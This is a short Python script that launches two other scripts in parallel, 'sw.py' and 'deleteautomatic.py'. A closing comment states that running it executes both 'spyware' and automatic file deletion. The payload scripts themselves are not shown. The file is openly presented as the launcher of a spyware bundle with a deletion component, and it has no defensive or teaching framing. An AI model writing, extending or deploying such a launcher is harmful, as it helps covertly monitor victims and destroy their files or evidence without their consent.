import subprocess

def run_parallel():
    process1 = subprocess.Popen(['python', 'sw.py'])
    process2 = subprocess.Popen(['python', 'deleteautomatic.py'])
    process1.wait()
    process2.wait()
    
if __name__ == "__main__":
    run_parallel()




# JUST BY RUNNING THIS CODE BOTH SPYWARE AND AUTOMATIC DELETION OF FILE WILL EXECUTE 
